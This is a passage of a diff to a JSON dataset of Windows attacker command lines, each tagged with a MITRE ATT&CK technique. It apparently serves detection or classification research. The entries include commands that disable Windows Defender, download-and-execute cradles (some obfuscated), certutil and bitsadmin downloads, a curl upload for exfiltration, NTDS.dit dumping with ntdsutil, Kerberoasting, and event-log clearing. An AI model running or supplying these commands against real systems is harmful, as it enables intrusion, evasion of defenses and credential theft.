         "RiskScore":null,
@@ -987,10 +1076,11 @@
         "MitreAttackClassification":"T1057",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2025,
+        "ID":91,
         "Command":"powershell.exe Get-Process",
         "Description":null,
         "RiskScore":null,
@@ -998,10 +1088,11 @@
         "MitreAttackClassification":"T1057",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2026,
+        "ID":92,
         "Command":"ping.exe -n 1 -a <ip_address>",
         "Description":null,
         "RiskScore":null,
@@ -1009,10 +1100,11 @@
         "MitreAttackClassification":"T1016",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2027,
+        "ID":93,
         "Command":"whoami",
         "Description":null,
         "RiskScore":null,
@@ -1020,10 +1112,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2028,
+        "ID":94,
         "Command":"whoami \/all",
         "Description":null,
         "RiskScore":null,
@@ -1031,10 +1124,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2029,
+        "ID":95,
         "Command":"whoami \/upn",
         "Description":null,
         "RiskScore":null,
@@ -1042,10 +1136,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2030,
+        "ID":96,
         "Command":"quser.exe quser",
         "Description":null,
         "RiskScore":null,
@@ -1053,10 +1148,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2031,
+        "ID":97,
         "Command":"quser.exe whoami",
         "Description":null,
         "RiskScore":null,
@@ -1064,10 +1160,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2032,
+        "ID":98,
         "Command":"net user",
         "Description":null,
         "RiskScore":null,
@@ -1075,10 +1172,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2033,
+        "ID":99,
         "Command":"net user <username>",
         "Description":null,
         "RiskScore":null,
@@ -1086,10 +1184,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2034,
+        "ID":100,
         "Command":"net user \/domain",
         "Description":null,
         "RiskScore":null,
@@ -1097,10 +1196,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2035,
+        "ID":101,
         "Command":"net user <username> \/domain",
         "Description":null,
         "RiskScore":null,
@@ -1108,10 +1208,11 @@
         "MitreAttackClassification":"T1033",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2036,
+        "ID":102,
         "Command":"powershell.exe $Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter = '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall(); foreach ( $results in $results ) { $u = $results.GetDirectoryEntry();",
         "Description":null,
         "RiskScore":null,
@@ -1119,10 +1220,11 @@
         "MitreAttackClassification":"T1558.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2037,
+        "ID":103,
         "Command":"samAccountName = $u.samAccountName; foreach ( $s in $u.servicePrincipalName )",
         "Description":null,
         "RiskScore":null,
@@ -1130,10 +1232,11 @@
         "MitreAttackClassification":"T1558.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2038,
+        "ID":104,
         "Command":"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<target_file>.exe\" \/v Debugger \/d \"<threat_actor_file>.<ext>\"",
         "Description":null,
         "RiskScore":null,
@@ -1141,10 +1244,11 @@
         "MitreAttackClassification":"T1546.012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2039,
+        "ID":105,
         "Command":"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<target_file>.exe\" \/v GlobalFlag \/t REG_DWORD \/d <GlobalFlag_registry_entry_value>",
         "Description":null,
         "RiskScore":null,
@@ -1152,10 +1256,11 @@
         "MitreAttackClassification":"T1546.012",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2040,
+        "ID":106,
         "Command":"cmd.exe \/C copy * \\\\<remote_ip>\\C$\\windows\\destination\\folder",
         "Description":null,
         "RiskScore":null,
@@ -1163,10 +1268,11 @@
         "MitreAttackClassification":"T1570",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2041,
+        "ID":107,
         "Command":"cmd.exe \/C curl -F \"file=@$selfpath\\<filename>.rar\" --ssl-no-revoke https[:]\/\/<web_service>.io",
         "Description":null,
         "RiskScore":null,
@@ -1174,10 +1280,11 @@
         "MitreAttackClassification":"T1567",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2042,
+        "ID":108,
         "Command":"PowerShell -exec bypass -command Set-MpPreference -DisableRealtimeMonitoring $True",
         "Description":null,
         "RiskScore":null,
@@ -1185,10 +1292,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2043,
+        "ID":109,
         "Command":"\"$windir\\$system32\\WindowsPowerShell\\v1.0\\PowerShell.exe\" Add-MpPreference -ExclusionPath \"\\$path\\to\\file.ext\"",
         "Description":null,
         "RiskScore":null,
@@ -1196,10 +1304,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2044,
+        "ID":110,
         "Command":"\ufeffschtasks \/delete \/tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" \/f schtasks \/delete \/tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" \/f schtasks \/delete \/tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" \/f schtasks \/delete \/tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" \/f Set-MpPreference -DisableRealtimeMonitoring $true",
         "Description":null,
         "RiskScore":null,
@@ -1207,10 +1316,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2045,
+        "ID":111,
         "Command":"Set-MpPreference -DisableArchiveScanning $true",
         "Description":null,
         "RiskScore":null,
@@ -1218,10 +1328,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2046,
+        "ID":112,
         "Command":"Set-MpPreference -DisableBehaviorMonitoring $true",
         "Description":null,
         "RiskScore":null,
@@ -1229,10 +1340,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2047,
+        "ID":113,
         "Command":"Set-MpPreference -Disable IOAVProtection $true",
         "Description":null,
         "RiskScore":null,
@@ -1240,10 +1352,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2048,
+        "ID":114,
         "Command":"Set-MpPreference -Disable Intrusion PreventionSystem $true",
         "Description":null,
         "RiskScore":null,
@@ -1251,10 +1364,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2049,
+        "ID":115,
         "Command":"Set-MpPreference -DisableScanningNetworkFiles $true",
         "Description":null,
         "RiskScore":null,
@@ -1262,10 +1376,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2050,
+        "ID":116,
         "Command":"Set-MpPreference -MAPSReporting",
         "Description":null,
         "RiskScore":null,
@@ -1273,10 +1388,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2051,
+        "ID":117,
         "Command":"Set-MpPreference -DisableCatchupFullScan $True",
         "Description":null,
         "RiskScore":null,
@@ -1284,10 +1400,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2052,
+        "ID":118,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" \/v \"DisableAntiSpyware\" \/t REG_DWORD \/d 0x1 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1295,10 +1412,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2053,
+        "ID":119,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" \/v \"AllowFastServiceStartup\" \/t REG_DWORD \/d 0x0 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1306,10 +1424,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2054,
+        "ID":120,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" \/v \"ServiceKeepAlive\" \/t REG_DWORD \/d 0x0 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1317,10 +1436,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2055,
+        "ID":121,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" \/v \"DisableIOAVProtection\" \/t REG_DWORD \/d 0x1 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1328,10 +1448,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2056,
+        "ID":122,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" \/v \"DisableRealtimeMonitoring\" \/t REG_DWORD \/d 0x1 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1339,10 +1460,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2057,
+        "ID":123,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" \/v \"DisableBlockAtFirstSeen\" \/t REG_DWORD \/d 0x1 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1350,10 +1472,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2058,
+        "ID":124,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" \/v \"LocalSettingOverrideSpynetReporting\" \/t REG_DWORD \/d 0x0 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1361,10 +1484,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2059,
+        "ID":125,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet\" \/v \"SubmitSamplesConsent\" \/t REG_DWORD \/d 0x2 \/f",
         "Description":null,
         "RiskScore":null,
@@ -1372,10 +1496,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2060,
+        "ID":126,
         "Command":"REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" \/v \"NotificationSuppress\" \/t REG_DWORD \/d 0x1 \/fe",
         "Description":null,
         "RiskScore":null,
@@ -1383,10 +1508,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2061,
+        "ID":127,
         "Command":"powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI",
         "Description":null,
         "RiskScore":null,
@@ -1394,10 +1520,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2062,
+        "ID":128,
         "Command":"wmic \/node:\"<IP_Address>\" process call create \"powershell Set-MpPreference -DisableRealtimeMonitoring $true\"",
         "Description":null,
         "RiskScore":null,
@@ -1405,10 +1532,11 @@
         "MitreAttackClassification":"T1562.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2063,
+        "ID":129,
         "Command":"sc <server_IP> create <service_name> <option1> <option2>",
         "Description":null,
         "RiskScore":null,
@@ -1416,10 +1544,11 @@
         "MitreAttackClassification":"T1543.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2064,
+        "ID":130,
         "Command":"sc <server_IP> config <service_name> binpath= \u201c<path_to_executable>\u201d",
         "Description":null,
         "RiskScore":null,
@@ -1427,10 +1556,11 @@
         "MitreAttackClassification":"T1543.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2065,
+        "ID":131,
         "Command":"sc <service_name> binpath= \u201c<path_to_executable>\u201d",
         "Description":null,
         "RiskScore":null,
@@ -1438,10 +1568,11 @@
         "MitreAttackClassification":"T1543.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2066,
+        "ID":132,
         "Command":"powershell.exe -exec bypass -C IEX ((New-Object Net.WebClient).downloadstring('http[:]\/\/<url>\/file.ext'))",
         "Description":null,
         "RiskScore":null,
@@ -1449,10 +1580,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2067,
+        "ID":133,
         "Command":"powershell.exe -exec bypass -C IEX ((new-object net.webclient).downloadstring('http[:]\/\/<url>\/file.ext'))",
         "Description":null,
         "RiskScore":null,
@@ -1460,10 +1592,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2068,
+        "ID":134,
         "Command":"powershell.exe -exec bypass -C IEX ((new-object net.tneilCbeW).daolnwoDstring('http[:]\/\/<url>\/file.ext'))",
         "Description":null,
         "RiskScore":null,
@@ -1471,10 +1604,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2069,
+        "ID":135,
         "Command":"powershell.exe -exec bypass -C IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString('http[:]\/\/<url>\/file.ext'))",
         "Description":null,
         "RiskScore":null,
@@ -1482,10 +1616,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2070,
+        "ID":136,
         "Command":"powershell.exe Invoke-WebRequest -Uri \"https[:]\/\/<url>\/file.ext\" -OutFile c:\\file.ext -UseBasicParsing\"",
         "Description":null,
         "RiskScore":null,
@@ -1493,10 +1628,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2071,
+        "ID":137,
         "Command":"powershell.exe iwr -Uri \"https[:]\/\/<url>\/file.ext\" -OutFile c:\\<output_file>.ext -UseBasicParsing\"",
         "Description":null,
         "RiskScore":null,
@@ -1504,10 +1640,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2072,
+        "ID":138,
         "Command":"\u0441md.exe \/c PowerShell iwr -Uri http:\/\/<IP_address>:<port>\/<file_name>.ext -OutFile c:\\<output_file>.ext -UseBasicParsing",
         "Description":null,
         "RiskScore":null,
@@ -1515,10 +1652,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2073,
+        "ID":139,
         "Command":"PowerShell -Command $wc = New-Object System.Net.WebClient; $tempfile = [System.",
         "Description":null,
         "RiskScore":null,
@@ -1526,10 +1664,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2074,
+        "ID":140,
         "Command":"IO.Path]::GetTempFileName(); $tempfile += '.<ext>'; $wc.DownloadFile('[URL]', $tempfile); &",
         "Description":null,
         "RiskScore":null,
@@ -1537,10 +1676,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2075,
+        "ID":141,
         "Command":"$tempfile ; Remove-Item -Force $tempfile",
         "Description":null,
         "RiskScore":null,
@@ -1548,10 +1688,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2076,
+        "ID":142,
         "Command":"powershell.exe -exec bypass -C Invoke-WebRequest \"http:\/<IP_address>:<port>\/<file_name>.ext\" -OutFile \"<output_file>.ext\"",
         "Description":null,
         "RiskScore":null,
@@ -1559,10 +1700,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2077,
+        "ID":143,
         "Command":"powershell.exe -C wget \"http[:]\/\/<IP_address>:<port>\/<file_name>.ext\" -OutFile \"<output_file>.ext\"",
         "Description":null,
         "RiskScore":null,
@@ -1570,10 +1712,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2078,
+        "ID":144,
         "Command":"cmd.exe \/c certutil -urlcache -split -f hxxp[:]\/\/<IP_address>:<port>\/<file_name>.ext $path\\to\\outfile\\<output_file>.ext",
         "Description":null,
         "RiskScore":null,
@@ -1581,10 +1724,11 @@
         "MitreAttackClassification":"T1105",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2079,
+        "ID":145,
         "Command":"wevtutil cl system",
         "Description":null,
         "RiskScore":null,
@@ -1592,10 +1736,11 @@
         "MitreAttackClassification":"T1070.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2080,
+        "ID":146,
         "Command":"wevtutil cl security",
         "Description":null,
         "RiskScore":null,
@@ -1603,10 +1748,11 @@
         "MitreAttackClassification":"T1070.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2081,
+        "ID":147,
         "Command":"wevtutil cl application",
         "Description":null,
         "RiskScore":null,
@@ -1614,10 +1760,11 @@
         "MitreAttackClassification":"T1070.001",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2082,
+        "ID":148,
         "Command":"net use \\\\<remote ip> \"<password>\" \/u:<domain>\\<username>",
         "Description":null,
         "RiskScore":null,
@@ -1625,10 +1772,11 @@
         "MitreAttackClassification":"T1021.002",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2083,
+        "ID":149,
         "Command":"schtasks \/s <remote_host> \/tn <task_name> \/u <domain>\\<username> \/p <password> \/create \/ru system \/sc",
         "Description":null,
         "RiskScore":null,
@@ -1636,10 +1784,11 @@
         "MitreAttackClassification":"T1053.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2084,
+        "ID":150,
         "Command":"schtasks \/create -s <remote> \/tn <task_name> \/tr <path_to_executable> \/sc <schedule_type> \/st <start_time>",
         "Description":null,
         "RiskScore":null,
@@ -1647,10 +1796,11 @@
         "MitreAttackClassification":"T1053.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2085,
+        "ID":151,
         "Command":"schtasks \/create \/ru <user> \/sc <service_name> \/tn <task_name>",
         "Description":null,
         "RiskScore":null,
@@ -1658,10 +1808,11 @@
         "MitreAttackClassification":"T1053.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2086,
+        "ID":152,
         "Command":"schtasks \/s <remote_host> \/tn one \/u <domain>\\<username> \/p <password> \/f \/delete",
         "Description":null,
         "RiskScore":null,
@@ -1669,10 +1820,11 @@
         "MitreAttackClassification":"T1070.009",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2087,
+        "ID":153,
         "Command":"wmic process call create \"ntdsutil \\\"ac i ntds\\\" ifm \\\"create full <file_path>",
         "Description":null,
         "RiskScore":null,
@@ -1680,10 +1832,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2088,
+        "ID":154,
         "Command":"wmic process call create \"ntdsutil \\\"activate instance ntds\\\" ifm \\\"create full <file_path>",
         "Description":null,
         "RiskScore":null,
@@ -1691,10 +1844,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2089,
+        "ID":155,
         "Command":"wmic process call create \"cmd.exe \/c ntdsutil \\\"ac i ntds\\\" ifm \\\"create full <file_path>",
         "Description":null,
         "RiskScore":null,
@@ -1702,10 +1856,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2090,
+        "ID":156,
         "Command":"wmic process call create \"cmd.exe \/c mkdir <file_path> & ntdsutil \\\"ac i ntds\\\" ifm \\\"create full <file_path>",
         "Description":null,
         "RiskScore":null,
@@ -1713,10 +1868,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2091,
+        "ID":157,
         "Command":"ntdsutil.exe 'ac i ntds' 'ifm' 'create full \u0421:\\Windows\\temp\\<folder>' q q",
         "Description":null,
         "RiskScore":null,
@@ -1724,10 +1880,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2092,
+        "ID":158,
         "Command":"ntdsutil.exe 'activate instance ntds' 'ifm' 'create full \u0421:\\Windows\\temp\\<folder>' q q",
         "Description":null,
         "RiskScore":null,
@@ -1735,10 +1892,11 @@
         "MitreAttackClassification":"T1003.003",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2093,
+        "ID":159,
         "Command":"net use * \/delete \/y",
         "Description":null,
         "RiskScore":null,
@@ -1746,10 +1904,11 @@
         "MitreAttackClassification":"T1070.005",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2094,
+        "ID":160,
         "Command":"echo list volume | diskpart",
         "Description":null,
         "RiskScore":null,
@@ -1757,10 +1916,11 @@
         "MitreAttackClassification":"T1083",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2095,
+        "ID":161,
         "Command":"echo lis vol | diskpart",
         "Description":null,
         "RiskScore":null,
@@ -1768,10 +1928,11 @@
         "MitreAttackClassification":"T1083",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2096,
+        "ID":162,
         "Command":"wmic \/node:<IP_address> \/user:\"<user>\" \/password:\"<password>\" logicaldisk get caption,description,drivetype,providername,volumename",
         "Description":null,
         "RiskScore":null,
@@ -1779,10 +1940,11 @@
         "MitreAttackClassification":"T1083",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2097,
+        "ID":163,
         "Command":"Get-CimInstance win32_logicaldisk",
         "Description":null,
         "RiskScore":null,
@@ -1790,10 +1952,11 @@
         "MitreAttackClassification":"T1083",
         "ProgrammingLanguage":null,
         "CMD_Script":"command",
-        "DynTested":null
+        "DynTested":null,
+        "ObfuscationLevel":null
     },
     {
-        "ID":2098,
+        "ID":164,
         "Command":"cmd.exe \/c bitsadmin \/transfer n http[:]\/\/<IP_address>:<port>\/<file_name>.ext $public\\Downloads\\<output_file>.ext",
         "Description":null,
         "RiskScore":null,
@@ -1801,10 +1964,11 @@
         "MitreAttackClassification":"T1197",
         "ProgrammingLanguage":null,
         "CMD_Script":"script",
-        "DynTested":null
+        "DynTested":null,
